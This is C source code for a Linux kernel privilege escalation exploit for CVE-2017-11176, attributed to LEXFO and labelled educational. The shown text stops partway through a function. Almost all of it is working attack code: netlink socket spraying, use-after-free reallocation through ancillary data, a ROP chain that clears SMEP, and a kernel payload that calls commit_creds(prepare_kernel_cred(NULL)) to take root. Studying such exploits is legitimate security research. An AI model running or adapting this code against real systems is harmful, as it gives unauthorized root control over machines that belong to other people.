/*
 * CVE-2017-11176: "mq_notify: double sock_put()" by LEXFO (2018).
 *
 * DISCLAIMER: The following code is for EDUCATIONAL purpose only. Do not
 * use it on a system without authorizations.
 *
 * WARNING: The exploit WILL NOT work on your target, it requires modifications!
 *
 * Compile with:
 *
 *  gcc -fpic -O0 -std=c99 -Wall -pthread cve-2017-11176.c -o exploit
 *
 * For a complete explanation / analysis, please read the following series:
 *
 * - https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html
 * - https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html
 * - https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html
 * - https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html
 */

#define _GNU_SOURCE
#include <asm/types.h>
#include <mqueue.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <linux/netlink.h>
#include <pthread.h>
#include <errno.h>
#include <stdbool.h>
#include <sched.h>
#include <stddef.h>
#include <sys/mman.h>
#include <stdint.h>

// ============================================================================
// ----------------------------------------------------------------------------
// ============================================================================

#define NOTIFY_COOKIE_LEN (32)
#define SOL_NETLINK (270) // from [include/linux/socket.h]

#define NB_REALLOC_THREADS 200
#define KMALLOC_TARGET 1024

#define MAX_SOCK_PID_SPRAY 300

#define MAGIC_NL_PID 0x11a5dcee
#define MAGIC_NL_GROUPS 0x0

// ----------------------------------------------------------------------------

// avoid library wrappers
#define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)
#define _mmap(addr, length, prot, flags, fd, offset) syscall(__NR_mmap, addr, length, prot, flags, fd, offset)
#define _munmap(addr, length) syscall(_NR_munmap, addr, length)
#define _socket(domain, type, protocol) syscall(__NR_socket, domain, type, protocol)
#define _setsockopt(sockfd, level, optname, optval, optlen) \
  syscall(__NR_setsockopt, sockfd, level, optname, optval, optlen)
#define _getsockopt(sockfd, level, optname, optval, optlen) \
  syscall(__NR_getsockopt, sockfd, level, optname, optval, optlen)
#define _dup(oldfd) syscall(__NR_dup, oldfd)
#define _close(fd) syscall(__NR_close, fd)
#define _sendmsg(sockfd, msg, flags) syscall(__NR_sendmsg, sockfd, msg, flags)
#define _bind(sockfd, addr, addrlen) syscall(__NR_bind, sockfd, addr, addrlen)
#define _getpid() syscall(__NR_getpid)
#define _gettid() syscall(__NR_gettid)
#define _sched_setaffinity(pid, cpusetsize, mask) \
  syscall(__NR_sched_setaffinity, pid, cpusetsize, mask)
#define _open(pathname, flags) syscall(__NR_open, pathname, flags)
#define _read(fd, buf, count) syscall(__NR_read, fd, buf, count)
#define _getsockname(sockfd, addr, addrlen) syscall(__NR_getsockname, sockfd, addr, addrlen)
#define _connect(sockfd, addr, addrlen) syscall(__NR_connect, sockfd, addr, addrlen)
#define _sched_yield() syscall(__NR_sched_yield)
#define _lseek(fd, offset, whence) syscall(__NR_lseek, fd, offset, whence)

// ----------------------------------------------------------------------------

#define PRESS_KEY() \
  do { printf("[ ] press key to continue...\n"); getchar(); } while(0)

#define BUILD_BUG_ON(cond) ((void)sizeof(char[1 - 2 * !!(cond)]))

// ----------------------------------------------------------------------------

// target specific offset
#define NLK_PID_OFFSET                  0x288
#define NLK_GROUPS_OFFSET               0x2a0
#define NLK_WAIT_OFFSET                 0x2b0
#define WQ_HEAD_TASK_LIST_OFFSET        0x8
#define WQ_ELMT_FUNC_OFFSET             0x10
#define WQ_ELMT_TASK_LIST_OFFSET        0x18
#define TASK_STRUCT_FILES_OFFSET        0x770
#define FILES_STRUCT_FDT_OFFSET         0x8
#define FDT_FD_OFFSET                   0x8
#define FILE_STRUCT_PRIVATE_DATA_OFFSET 0xa8
#define SOCKET_SK_OFFSET                0x38

// kernel function symbols
#define NL_PID_HASHFN         ((void*) 0xffffffff814b6da0)
#define NETLINK_TABLE_GRAB    ((void*) 0xffffffff814b7ea0)
#define NETLINK_TABLE_UNGRAB  ((void*) 0xffffffff814b73e0)
#define COMMIT_CREDS          ((void*) 0xffffffff810b8ee0)
#define PREPARE_KERNEL_CRED   ((void*) 0xffffffff810b90c0)
#define NL_TABLE_ADDR         ((void*) 0xffffffff824528c0)

// gadgets in [_text; _etext]
#define XCHG_EAX_ESP_ADDR         ((uint64_t) 0xffffffff8107b6b8)
#define MOV_PTR_RDI_MIN4_EAX_ADDR ((uint64_t) 0xffffffff811513b3)
#define POP_RDI_ADDR              ((uint64_t) 0xffffffff8103b81d)
#define MOV_RAX_RBP_ADDR          ((uint64_t) 0xffffffff813606d4)
#define SHR_RAX_16_ADDR           ((uint64_t) 0xffffffff810621ff)
#define POP_RBP_ADDR              ((uint64_t) 0xffffffff811b97bf)
#define MOV_RAX_CR4_LEAVE_ADDR    ((uint64_t) 0xffffffff81003009)
#define MOV_CR4_RDI_LEAVE_ADDR    ((uint64_t) 0xffffffff8100328d)
#define AND_RAX_RDX_ADDR          ((uint64_t) 0xffffffff8130c249)
#define MOV_EDI_EAX_ADDR          ((uint64_t) 0xffffffff814f118b)
#define MOV_EDX_EDI_ADDR          ((uint64_t) 0xffffffff8139ca54)
#define POP_RCX_ADDR              ((uint64_t) 0xffffffff81004abc)
#define JMP_RCX_ADDR              ((uint64_t) 0xffffffff8103357c)

#define THREAD_SIZE (4096 << 2)

// ----------------------------------------------------------------------------

struct realloc_thread_arg
{
  pthread_t tid;
  int recv_fd;
  int send_fd;
  struct sockaddr_un addr;
};

struct unblock_thread_arg
{
  int sock_fd;
  int unblock_fd;
  bool is_ready; // we can use pthread barrier instead
};

struct sock_pid
{
  int sock_fd;
  uint32_t pid;
};

// ----------------------------------------------------------------------------

struct hlist_node {
  struct hlist_node *next, **pprev;
};

struct hlist_head {
  struct hlist_node *first;
};

struct nl_pid_hash {
  struct hlist_head* table;
  uint64_t rehash_time;
  uint32_t mask;
  uint32_t shift;
  uint32_t entries;
  uint32_t max_shift;
  uint32_t rnd;
};

struct netlink_table {
  struct nl_pid_hash hash;
  void* mc_list;
  void* listeners;
  uint32_t nl_nonroot;
  uint32_t groups;
  void* cb_mutex;
  void* module;
  uint32_t registered;
};

struct list_head
{
  struct list_head *next, *prev;
};

struct wait_queue_head
{
  int slock;
  struct list_head task_list;
};

typedef int (*wait_queue_func_t)(void *wait, unsigned mode, int flags, void *key);

struct wait_queue
{
  unsigned int flags;
#define WQ_FLAG_EXCLUSIVE 0x01
  void *private;
  wait_queue_func_t func;
  struct list_head task_list;
};

struct socket {
  char pad[SOCKET_SK_OFFSET];
  void *sk;
};

struct file {
  char pad[FILE_STRUCT_PRIVATE_DATA_OFFSET];
  void *private_data;
};

struct fdtable {
  char pad[FDT_FD_OFFSET];
  struct file **fd;
};

struct files_struct {
  char pad[FILES_STRUCT_FDT_OFFSET];
  struct fdtable *fdt;
};

struct task_struct {
  char pad[TASK_STRUCT_FILES_OFFSET];
  struct files_struct *files;
};

struct thread_info {
	struct task_struct	*task;
  char pad[0];
};

// ----------------------------------------------------------------------------

typedef void (*netlink_table_grab_func)(void);
typedef void (*netlink_table_ungrab_func)(void);
typedef struct hlist_head* (*nl_pid_hashfn_func)(struct nl_pid_hash *hash, uint32_t pid);
typedef int (*commit_creds_func)(void *new);
typedef void* (*prepare_kernel_cred_func)(void *daemon);

#define netlink_table_grab() \
  (((netlink_table_grab_func)(NETLINK_TABLE_GRAB))())
#define netlink_table_ungrab() \
  (((netlink_table_ungrab_func)(NETLINK_TABLE_UNGRAB))())
#define nl_pid_hashfn(hash, pid) \
 (((nl_pid_hashfn_func)(NL_PID_HASHFN))(hash, pid))
#define commit_creds(cred) \
  (((commit_creds_func)(COMMIT_CREDS))(cred))
#define prepare_kernel_cred(daemon) \
  (((prepare_kernel_cred_func)(PREPARE_KERNEL_CRED))(daemon))

// ----------------------------------------------------------------------------

static volatile size_t g_nb_realloc_thread_ready = 0;
static volatile size_t g_realloc_now = 0;
static volatile char g_realloc_data[KMALLOC_TARGET];

static volatile struct list_head  g_fake_next_elt;
static volatile struct wait_queue *g_uland_wq_elt;
static volatile char *g_fake_stack;

static volatile uint64_t saved_esp;
static volatile uint64_t saved_rbp_lo;
static volatile uint64_t saved_rbp_hi;
static volatile uint64_t restored_rbp;
static volatile uint64_t restored_rsp;

static struct sock_pid g_target;
static struct sock_pid g_guard;
static int unblock_fd = 1;

// ============================================================================
// ----------------------------------------------------------------------------
// ============================================================================

#define get_thread_info(thread_stack_ptr) \
  ((struct thread_info*) (thread_stack_ptr & ~(THREAD_SIZE - 1)))

#define get_current(thread_stack_ptr) \
  ((struct task_struct*) (get_thread_info(thread_stack_ptr)->task))

static void payload(void)
{
  struct task_struct *current = get_current(restored_rsp);
  struct socket *sock = current->files->fdt->fd[unblock_fd]->private_data;
  void *sk;

  sk = sock->sk; // keep it for list walking
  sock->sk = NULL; // fix the 'sk' dangling pointer

  // lock all hash tables
  netlink_table_grab();

  // retrieve NETLINK_USERSOCK's hash table
  struct netlink_table *nl_table = * (struct netlink_table**)NL_TABLE_ADDR; // deref it!
  struct nl_pid_hash *hash = &(nl_table[NETLINK_USERSOCK].hash);

  // retrieve the bucket list
  struct hlist_head *bucket = nl_pid_hashfn(hash, g_target.pid);

  // walk the bucket list
  struct hlist_node *cur;
  struct hlist_node **pprev = &bucket->first;
  for (cur = bucket->first; cur; pprev = &cur->next, cur = cur->next)
  {
    // is this our target ?
    if (cur == (struct hlist_node*)sk)
    {
      // fix the 'next' and 'pprev' field
      if (cur->next == (struct hlist_node*)KMALLOC_TARGET) // 'cmsg_len' value (reallocation)
        cur->next = NULL; // first scenario: was the last element in the list
      cur->pprev = pprev;

      // __hlist_del() operation (dangling pointers fix up)
      *(cur->pprev) = cur->next;
      if (cur->next)
        cur->next->pprev = pprev;

      hash->entries--; // make it clean

      // stop walking
      break;
    }
  }

  // release the lock
  netlink_table_ungrab();

  // privilege (de-)escalation
  commit_creds(prepare_kernel_cred(NULL));
}

// ============================================================================
// ----------------------------------------------------------------------------
// ============================================================================

/*
 * Migrates the current thread to CPU#0.
 *
 * Returns 0 on success, -1 on error.
 */

static int migrate_to_cpu0(void)
{
  cpu_set_t set;

  CPU_ZERO(&set);
  CPU_SET(0, &set);

  if (_sched_setaffinity(_getpid(), sizeof(set), &set) == -1)
  {
    perror("[-] sched_setaffinity");
    return -1;
  }

  return 0;
}

// ============================================================================
// ----------------------------------------------------------------------------
// ============================================================================

/*
 * Creates a NETLINK_USERSOCK netlink socket, binds it and retrieves its pid.
 * Argument @sp must not be NULL.
 *
 * Returns 0 on success, -1 on error.
 */

static int create_netlink_candidate(struct sock_pid *sp)
{
  struct sockaddr_nl addr = {
    .nl_family = AF_NETLINK,
    .nl_pad = 0,
    .nl_pid = 0, // zero to use netlink_autobind()
    .nl_groups = 0 // no groups

  };
  size_t addr_len = sizeof(addr);

  if ((sp->sock_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK)) == -1)
  {
    perror("[-] socket");
    goto fail;
  }

  if (_bind(sp->sock_fd, (struct sockaddr*)&addr, sizeof(addr)) == -1)
  {
    perror("[-] bind");
    goto fail_close;
  }

  if (_getsockname(sp->sock_fd, &addr, &addr_len))
  {
    perror("[-] getsockname");
    goto fail_close;
  }

  sp->pid = addr.nl_pid;

  return 0;

fail_close:
  close(sp->sock_fd);
fail:
  sp->sock_fd = -1;
  sp->pid = -1;
  return -1;
}

// ----------------------------------------------------------------------------

/*
 * Parses @proto hash table from '/proc/net/netlink' and allocates/fills the
 * @pids array. The total numbers of pids matched is stored in @nb_pids.
 *
 * A typical output looks like:
 *
 *    $ cat /proc/net/netlink
 *    sk       Eth Pid    Groups   Rmem     Wmem     Dump     Locks     Drops
 *    ffff88001eb47800 0   0      00000000 0        0        (null) 2        0
 *    ffff88001fa65800 6   0      00000000 0        0        (null) 2        0
 *
 * Every line is printed from netlink_seq_show():
 *
 *    seq_printf(seq, "%p %-3d %-6d %08x %-8d %-8d %p %-8d %-8d\n"
 *
 * Returns 0 on success, -1 on error.
 */

static int parse_proc_net_netlink(int **pids, size_t *nb_pids, uint32_t proto)
{
  int proc_fd;
  char buf[4096];
  int ret;
  char *ptr;
  char *eol_token;
  size_t nb_bytes_read = 0;
  size_t tot_pids = 1024;

  *pids = NULL;
  *nb_pids = 0;

  if ((*pids = calloc(tot_pids, sizeof(**pids))) == NULL)
  {
    perror("[-] not enough memory");
    goto fail;
  }

  memset(buf, 0, sizeof(buf));
  if ((proc_fd = _open("/proc/net/netlink", O_RDONLY)) < 0)
  {
    perror("[-] open");
    goto fail;
  }

read_next_block:
  if ((ret = _read(proc_fd, buf, sizeof(buf))) < 0)
  {
    perror("[-] read");
    goto fail_close;
  }
  else if (ret == 0) // no more line to read
  {
    goto parsing_complete;
  }

  ptr = buf;

  if (strstr(ptr, "sk") != NULL) // this is the first line
  {
    if ((eol_token = strstr(ptr, "\n")) == NULL)
    {
      // XXX: we don't handle this case, we can't even read one line...
      printf("[-] can't find end of first line\n");
      goto fail_close;
    }
    nb_bytes_read += eol_token - ptr + 1;
    ptr = eol_token + 1; // skip the first line
  }

parse_next_line:
  // this is a "normal" line
  if ((eol_token = strstr(ptr, "\n")) == NULL) // current line is incomplete
  {
    if (_lseek(proc_fd, nb_bytes_read, SEEK_SET) == -1)
    {
      perror("[-] lseek");
      goto fail_close;
    }
    goto read_next_block;
  }
  else
  {
    void *cur_addr;
    int cur_proto;
    int cur_pid;

    sscanf(ptr, "%p %d %d", &cur_addr, &cur_proto, &cur_pid);

    if (cur_proto == proto)
    {
      if (*nb_pids >= tot_pids) // current array is not big enough, make it grow
      {
        tot_pids *= 2;
        if ((*pids = realloc(*pids, tot_pids * sizeof(int))) == NULL)
        {
          printf("[-] not enough memory\n");
          goto fail_close;
        }
      }

      *(*pids + *nb_pids) = cur_pid;
      *nb_pids = *nb_pids + 1;
    }

    nb_bytes_read += eol_token - ptr + 1;
    ptr = eol_token + 1;
    goto parse_next_line;
  }

parsing_complete:
  close(proc_fd);
  return 0;

fail_close:
  close(proc_fd);
fail:
  if (*pids != NULL)
    free(*pids);
  *nb_pids = 0;
  return -1;
}

// ----------------------------------------------------------------------------

/*
 * Prepare multiple netlink sockets and search "adjacent" ones. Arguments
 * @target and @guard must not be NULL.
 *
 * Returns 0 on success, -1 on error.
 */

static int find_netlink_candidates(struct sock_pid *target, struct sock_pid *guard)
{
  struct sock_pid candidates[MAX_SOCK_PID_SPRAY];
  int *pids = NULL;
  size_t nb_pids;
  int i, j;
  int nb_owned;
  int ret = -1;

  target->sock_fd = -1;
  guard->sock_fd = -1;

  // allocate a bunch of netlink sockets
  for (i = 0; i < MAX_SOCK_PID_SPRAY; ++i)
  {
    if (create_netlink_candidate(&candidates[i]))
    {
      printf("[-] failed to create a new candidate\n");
      goto release_candidates;
    }
  }
  printf("[+] %d candidates created\n", MAX_SOCK_PID_SPRAY);

  if (parse_proc_net_netlink(&pids, &nb_pids, NETLINK_USERSOCK))
  {
    printf("[-] failed to parse '/proc/net/netlink'\n");
    goto release_pids;
  }
  printf("[+] parsing '/proc/net/netlink' complete\n");

  // find two consecutives pid that we own (slow algorithm O(N*M))
  i = nb_pids;
  while (--i > 0)
  {
    guard->pid = pids[i];
    target->pid = pids[i - 1];
    nb_owned = 0;

    // the list is not ordered by pid, so we do a full walking
    for (j = 0; j < MAX_SOCK_PID_SPRAY; ++j)
    {
      if (candidates[j].pid == guard->pid)
      {
        guard->sock_fd = candidates[j].sock_fd;
        nb_owned++;
      }
      else if (candidates[j].pid == target->pid)
      {
        target->sock_fd = candidates[j].sock_fd;
        nb_owned++;
      }

      if (nb_owned == 2)
        goto found;
    }

    // reset sock_fd to release them
    guard->sock_fd = -1;
    target->sock_fd = -1;
  }

  // we didn't found any valid candidates, release and quit
  goto release_pids;

found:
  printf("[+] adjacent candidates found!\n");
  ret = 0; // we succeed

release_pids:
  i = MAX_SOCK_PID_SPRAY; // reset the candidate counter for release
  if (pids != NULL)
    free(pids);

release_candidates:
  while (--i >= 0)
  {
    // do not release the target/guard sockets
    if ((candidates[i].sock_fd != target->sock_fd) &&
        (candidates[i].sock_fd != guard->sock_fd))
    {
      close(candidates[i].sock_fd);
    }
  }

  return ret;
}

// ============================================================================
// ----------------------------------------------------------------------------
// ============================================================================

static void* unblock_thread(void *arg)
{
  struct unblock_thread_arg *uta = (struct unblock_thread_arg*) arg;
  int val = 3535; // need to be different than zero

  // notify the main thread that the unblock thread has been created. It *must*
  // directly call mq_notify().
  uta->is_ready = true;

  sleep(5); // gives some time for the main thread to block

  printf("[ ][unblock] closing %d fd\n", uta->sock_fd);
  _close(uta->sock_fd);

  printf("[ ][unblock] unblocking now\n");
  if (_setsockopt(uta->unblock_fd, SOL_NETLINK, NETLINK_NO_ENOBUFS, &val, sizeof(val)))
    perror("[+] setsockopt");
  return NULL;
}

// ----------------------------------------------------------------------------

static int decrease_sock_refcounter(int sock_fd, int unblock_fd)
{
  pthread_t tid;
  struct sigevent sigev;
  struct unblock_thread_arg uta;
  char sival_buffer[NOTIFY_COOKIE_LEN];

  // initialize the unblock thread arguments
  uta.sock_fd = sock_fd;
  uta.unblock_fd = unblock_fd;
  uta.is_ready = false;

  // initialize the sigevent structure
  memset(&sigev, 0, sizeof(sigev));
  sigev.sigev_notify = SIGEV_THREAD;
  sigev.sigev_value.sival_ptr = sival_buffer;
  sigev.sigev_signo = uta.sock_fd;

  printf("[ ] creating unblock thread...\n");
  if ((errno = pthread_create(&tid, NULL, unblock_thread, &uta)) != 0)
  {
    perror("[-] pthread_create");
    goto fail;
  }
  while (uta.is_ready == false) // spinlock until thread is created
    ;
  printf("[+] unblocking thread has been created!\n");

  printf("[ ] get ready to block\n");
  if ((_mq_notify((mqd_t)-1, &sigev) != -1) || (errno != EBADF))
  {
    perror("[-] mq_notify");
    goto fail;
  }
  printf("[+] mq_notify succeed\n");

  return 0;

fail:
  return -1;
}

// ----------------------------------------------------------------------------

static int fill_receive_buffer(struct sock_pid *target, struct sock_pid *guard)
{
  char buf[1024*10];
  int new_size = 0; // this will be reset to SOCK_MIN_RCVBUF

  struct sockaddr_nl addr = {
    .nl_family = AF_NETLINK,
    .nl_pad = 0,
    .nl_pid = target->pid, // use the target's pid
    .nl_groups = 0 // no groups
  };

  struct iovec iov = {
    .iov_base = buf,
    .iov_len = sizeof(buf)
  };

  struct msghdr mhdr = {
    .msg_name = &addr,
    .msg_namelen = sizeof(addr),
    .msg_iov = &iov,
    .msg_iovlen = 1,
    .msg_control = NULL,
    .msg_controllen = 0,
    .msg_flags = 0,
  };

  printf("[ ] preparing blocking netlink socket\n");

  if (_setsockopt(target->sock_fd, SOL_SOCKET, SO_RCVBUF, &new_size, sizeof(new_size)))
    perror("[-] setsockopt"); // no worry if it fails, it is just an optim.
  else
    printf("[+] receive buffer reduced\n");

  printf("[ ] flooding socket\n");
  while (_sendmsg(guard->sock_fd, &mhdr, MSG_DONTWAIT) > 0)
    ;
  if (errno != EAGAIN)
  {
    perror("[-] sendmsg");
    goto fail;
  }
  printf("[+] flood completed\n");

  printf("[+] blocking socket ready\n");

  return 0;

fail:
  printf("[-] failed to prepare blocking socket\n");
  return -1;
}

// ============================================================================
// ----------------------------------------------------------------------------
// ============================================================================

// ROP-chains
#define STORE_EAX(addr) \
  *stack++ = POP_RDI_ADDR; \
  *stack++ = (uint64_t)addr + 4; \
  *stack++ = MOV_PTR_RDI_MIN4_EAX_ADDR;

#define SAVE_ESP(addr) \
  STORE_EAX(addr);

#define SAVE_RBP(addr_lo, addr_hi) \
  *stack++ = MOV_RAX_RBP_ADDR;  \
  STORE_EAX(addr_lo); \
  *stack++ = SHR_RAX_16_ADDR; \
  *stack++ = SHR_RAX_16_ADDR; \
  STORE_EAX(addr_hi);

#define CR4_TO_RAX() \
  *stack++ = POP_RBP_ADDR; \
  *stack   = (unsigned long) stack + 2*8; stack++; /* skip 0xdeadbeef */ \
  *stack++ = MOV_RAX_CR4_LEAVE_ADDR; \
  *stack++ = 0xdeadbeef;  // dummy RBP value!

#define RDI_TO_CR4() \
  *stack++ = POP_RBP_ADDR; \
  *stack   = (unsigned long) stack + 2*8; stack++; /* skip 0xdeadbeef */ \
  *stack++ = MOV_CR4_RDI_LEAVE_ADDR; \
  *stack++ = 0xdeadbeef;  // dummy RBP value!

#define SMEP_MASK (~((uint64_t)(1 << 20))) // 0xffffffffffefffff

#define DISABLE_SMEP() \
  CR4_TO_RAX(); \
  *stack++ = POP_RDI_ADDR; \
  *stack++ = SMEP_MASK; \
  *stack++ = MOV_EDX_EDI_ADDR; \
  *stack++ = AND_RAX_RDX_ADDR; \
  *stack++ = MOV_EDI_EAX_ADDR; \
  RDI_TO_CR4();

#define JUMP_TO(addr) \
  *stack++ = POP_RCX_ADDR; \
  *stack++ = (uint64_t) addr; \
  *stack++ = JMP_RCX_ADDR;

// ----------------------------------------------------------------------------

extern void userland_entry(void); // make GCC happy

static __attribute__((unused)) void wrapper(void)
{
  // avoid the prologue
  __asm__ volatile( "userland_entry:" :: );

  // reconstruct original rbp/rsp
  restored_rbp = ((saved_rbp_hi << 32) | saved_rbp_lo);
  restored_rsp = ((saved_rbp_hi << 32) | saved_esp);

  __asm__ volatile( "movq %0, %%rax\n"
                    "movq %%rax, %%rbp\n"
                    :: "m"(restored_rbp)  );

  __asm__ volatile( "movq %0, %%rax\n"
                    "movq %%rax, %%rsp\n"
                    :: "m"(restored_rsp)  );

  uint64_t ptr = (uint64_t) &payload;
  __asm__ volatile( "movq %0, %%rax\n"
                    "call *%%rax\n"
                    :: "m"(ptr) );

  // arbitrary call primitive requires a non-null return value (i.e. non zero RAX register)
  __asm__ volatile( "movq $5555, %%rax\n"
                    :: );

  // avoid the epilogue and the "leave" instruction
  __asm__ volatile( "ret" :: );
}

// ----------------------------------------------------------------------------

static void build_rop_chain(uint64_t *stack)
{
  memset((void*)stack, 0xaa, 4096);

  SAVE_ESP(&saved_esp);
  SAVE_RBP(&saved_rbp_lo, &saved_rbp_hi);
  DISABLE_SMEP();
  JUMP_TO(&userland_entry);
}

// ----------------------------------------------------------------------------

static int allocate_uland_structs(void)
{
  // arbitrary value, must not collide with already mapped memory (/proc/<PID>/maps)
  void *starting_addr = (void*) 0x20000000;
  size_t max_try = 10;

retry:
  if (max_try-- <= 0)
  {
    printf("[-] failed to allocate structures at fixed location\n");
    return -1;
  }

  starting_addr += 4096;

  g_fake_stack = (char*) _mmap(starting_addr, 4096, PROT_READ|PROT_WRITE,
    MAP_FIXED|MAP_SHARED|MAP_ANONYMOUS|MAP_LOCKED|MAP_POPULATE, -1, 0);
  if (g_fake_stack == MAP_FAILED)
  {
    perror("[-] mmap");
    goto retry;
  }

  g_uland_wq_elt = (struct wait_queue*) _mmap(g_fake_stack + 0x100000000, 4096, PROT_READ|PROT_WRITE,
    MAP_FIXED|MAP_SHARED|MAP_ANONYMOUS|MAP_LOCKED|MAP_POPULATE, -1, 0);
  if (g_uland_wq_elt == MAP_FAILED)
  {
    perror("[-] mmap");
    munmap((void*)g_fake_stack, 4096);
    goto retry;
  }

  // paranoid check
  if ((char*)g_uland_wq_elt != ((char*)g_fake_stack + 0x100000000))
  {
    munmap((void*)g_fake_stack, 4096);
    munmap((void*)g_uland_wq_elt, 4096);
    goto retry;
  }

  printf("[+] userland structures allocated:\n");
  printf("[+] g_uland_wq_elt = %p\n", g_uland_wq_elt);
  printf("[+] g_fake_stack   = %p\n", g_fake_stack);

  return 0;
}

// ============================================================================
// ----------------------------------------------------------------------------
// ============================================================================

static bool can_use_realloc_gadget(void)
{
  int fd;
  int ret;
  bool usable = false;
  char buf[32];

  if ((fd = _open("/proc/sys/net/core/optmem_max", O_RDONLY)) < 0)
  {
    perror("[-] open");
    // TODO: fallback to sysctl syscall
    return false; // we can't conclude, try it anyway or not ?
  }

  memset(buf, 0, sizeof(buf));
  if ((ret = _read(fd, buf, sizeof(buf))) <= 0)
  {
    perror("[-] read");
    goto out;
  }
  printf("[ ] optmem_max = %s", buf);

  if (atol(buf) > 512) // only test if we can use the kmalloc-1024 cache
    usable = true;

out:
  _close(fd);
  return usable;
}

// ----------------------------------------------------------------------------

static int init_realloc_data(void)
{
  struct cmsghdr *first;
  int* pid = (int*)&g_realloc_data[NLK_PID_OFFSET];
  void** groups = (void**)&g_realloc_data[NLK_GROUPS_OFFSET];
  struct wait_queue_head *nlk_wait = (struct wait_queue_head*) &g_realloc_data[NLK_WAIT_OFFSET];

  memset((void*)g_realloc_data, 'A', sizeof(g_realloc_data));

  // necessary to pass checks in __scm_send()
  first = (struct cmsghdr*) &g_realloc_data;
  first->cmsg_len = sizeof(g_realloc_data);
  first->cmsg_level = 0; // must be different than SOL_SOCKET=1 to "skip" cmsg
  first->cmsg_type = 1; // <---- ARBITRARY VALUE

  // used by reallocation checker
  *pid = MAGIC_NL_PID;
  *groups = MAGIC_NL_GROUPS;

  // the first element in nlk's wait queue is our userland element (task_list field!)
  BUILD_BUG_ON(offsetof(struct wait_queue_head, task_list) != WQ_HEAD_TASK_LIST_OFFSET);
  nlk_wait->slock = 0;
  nlk_wait->task_list.next = (struct list_head*)&g_uland_wq_elt->task_list;
  nlk_wait->task_list.prev = (struct list_head*)&g_uland_wq_elt->task_list;

  // initialise the "fake" second element (because of list_for_each_entry_safe())
  g_fake_next_elt.next = (struct list_head*)&g_fake_next_elt; // point to itself
  g_fake_next_elt.prev = (struct list_head*)&g_fake_next_elt; // point to itself

  // initialise the userland wait queue element
  BUILD_BUG_ON(offsetof(struct wait_queue, func) != WQ_ELMT_FUNC_OFFSET);
  BUILD_BUG_ON(offsetof(struct wait_queue, task_list) != WQ_ELMT_TASK_LIST_OFFSET);
  g_uland_wq_elt->flags = WQ_FLAG_EXCLUSIVE; // set to exit after the first arbitrary call
  g_uland_wq_elt->private = NULL; // unused
  g_uland_wq_elt->func = (wait_queue_func_t) XCHG_EAX_ESP_ADDR; // <----- arbitrary call!
  g_uland_wq_elt->task_list.next = (struct list_head*)&g_fake_next_elt;
  g_uland_wq_elt->task_list.prev = (struct list_head*)&g_fake_next_elt;
  printf("[+] g_uland_wq_elt.func = %p\n", g_uland_wq_elt->func);

  return 0;
}

// ----------------------------------------------------------------------------

static bool check_realloc_succeed(int sock_fd, int magic_pid, unsigned long magic_groups)
{
  struct sockaddr_nl addr;
  size_t addr_len = sizeof(addr);

  memset(&addr, 0, sizeof(addr));
  // this will invoke "netlink_getname()" (uncontrolled read)
  if (_getsockname(sock_fd, &addr, &addr_len))
  {
    perror("[-] getsockname");
    goto fail;
  }
  printf("[ ] addr_len = %lu\n", addr_len);
  printf("[ ] addr.nl_pid = %d\n", addr.nl_pid);
  printf("[ ] magic_pid = %d\n", magic_pid);

  if (addr.nl_pid != magic_pid)
  {
    printf("[-] magic PID does not match!\n");
    goto fail;
  }

  if (addr.nl_groups != magic_groups)
  {
    printf("[-] groups pointer does not match!\n");
    goto fail;
  }

  return true;

fail:
  printf("[-] failed to check realloc success status!\n");
  return false;
}


// ----------------------------------------------------------------------------

static int init_unix_sockets(struct realloc_thread_arg * rta)
{
  struct timeval tv;
  static int sock_counter = 0;

  if (((rta->recv_fd = _socket(AF_UNIX, SOCK_DGRAM, 0)) < 0) ||
      ((rta->send_fd = _socket(AF_UNIX, SOCK_DGRAM, 0)) < 0))
  {
    perror("[-] socket");
    goto fail;
  }

  // bind an "abstract" socket (first byte is NULL)
  memset(&rta->addr, 0, sizeof(rta->addr));
  rta->addr.sun_family = AF_UNIX;
  sprintf(rta->addr.sun_path + 1, "sock_%lx_%d", _gettid(), ++sock_counter);
  if (_bind(rta->recv_fd, (struct sockaddr*)&rta->addr, sizeof(rta->addr)))
  {
    perror("[-] bind");
    goto fail;
  }

  if (_connect(rta->send_fd, (struct sockaddr*)&rta->addr, sizeof(rta->addr)))
  {
    perror("[-] connect");
    goto fail;
  }

  // set the timeout value to MAX_SCHEDULE_TIMEOUT
  memset(&tv, 0, sizeof(tv));
  if (_setsockopt(rta->recv_fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv)))
  {
    perror("[-] setsockopt");
    goto fail;
  }

  return 0;

fail:
  // TODO: release everything
  printf("[-] failed to initialize UNIX sockets!\n");
  return -1;
}

// ----------------------------------------------------------------------------

static void* realloc_thread(void *arg)
{
  struct realloc_thread_arg *rta = (struct realloc_thread_arg*) arg;
  struct msghdr mhdr;
  char buf[200];

  // initialize msghdr
  struct iovec iov = {
    .iov_base = buf,
    .iov_len = sizeof(buf),
  };
  memset(&mhdr, 0, sizeof(mhdr));
  mhdr.msg_iov = &iov;
  mhdr.msg_iovlen = 1;

  // the thread should inherit main thread cpumask, better be sure and redo-it!
  if (migrate_to_cpu0())
    goto fail;

  // make it block
  while (_sendmsg(rta->send_fd, &mhdr, MSG_DONTWAIT) > 0)
    ;
  if (errno != EAGAIN)
  {
    perror("[-] sendmsg");
    goto fail;
  }

  // use the arbitrary data now
  iov.iov_len = 16; // don't need to allocate lots of memory now
  mhdr.msg_control = (void*)g_realloc_data; // use the ancillary data buffer
  mhdr.msg_controllen = sizeof(g_realloc_data);

  g_nb_realloc_thread_ready++;

  while (!g_realloc_now) // spinlock until the big GO!
    ;

  // the next call should block while "reallocating"
  if (_sendmsg(rta->send_fd, &mhdr, 0) < 0)
  {
    perror("[-] sendmsg");
    goto fail;
  }

  return NULL;

fail:
  printf("[-] REALLOC THREAD FAILURE!!!\n");
  return NULL;
}

// ----------------------------------------------------------------------------

static int init_reallocation(struct realloc_thread_arg *rta, size_t nb_reallocs)
{
  int thread = 0;
  int ret = -1;

  if (!can_use_realloc_gadget())
  {
